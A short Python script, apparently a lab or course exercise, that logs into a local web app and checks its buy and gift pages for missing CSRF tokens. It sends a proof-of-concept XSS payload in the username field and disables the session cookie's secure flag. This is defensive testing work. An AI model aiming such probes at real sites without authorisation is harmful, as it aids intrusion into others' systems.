import requests

indexUrl = 'http://127.0.0.1/index.html'
buyinUrl = 'http://127.0.0.1/buy.html'
loginUrl = 'http://127.0.0.1/login.html'
gift0Url = 'http://127.0.0.1/gift/0'

userInfo = {'uname': 'gip200', 'pword': 'aaaaaa'}
payload = {'amount': '$0.00', 'username': '<script> alert(1) ; </script>'}

s = requests.Session()
cookies = s.cookies
cookies_dict = s.cookies.get_dict()

# try to log in, establish sessionid 
l = s.post(loginUrl, data=userInfo, cookies=cookies)
#print("just logged in, heres the cookie: " ,cookies)

for cookie in s.cookies:
    if cookie.name == 'sessionid':
        cookie.secure = 0
        break

b = s.get(buyinUrl,cookies=cookies)
print("Checking ", buyinUrl)
#check if the output string proves it is vulnerable
if b.text.find("csrfmiddlewaretoken") !=-1:
	print("Not CSRF Vulnerable.")
else:
	print("Vulnerable to CSRF!")

g = s.get(gift0Url, data=payload, cookies=cookies)

#check if the output string proves it is vulnerable
print("Checking ", gift0Url)
if g.text.find("csrfmiddlewaretoken") !=-1:
	print("Not CSRF Vulnerable.")
else:
	print("Vulnerable to CSRF!")
